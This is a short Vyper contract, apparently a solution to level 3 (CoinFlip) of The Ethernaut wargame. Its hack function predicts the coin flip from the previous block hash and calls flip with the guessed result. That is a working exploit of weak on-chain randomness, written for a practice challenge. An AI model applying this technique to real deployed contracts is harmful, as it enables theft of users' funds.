# pragma version 0.4.0
"""
@title A hack for level 3 (CoinFlip) of The Ethernaut
@license MIT
@author unluckyduke7
"""

interface CoinFlip:
	def flip(guess: bool) -> bool: nonpayable


@external
def hack(instance: CoinFlip):
	extcall instance.flip(convert(block.prevhash, uint256) // 2 ** 255 == 1)
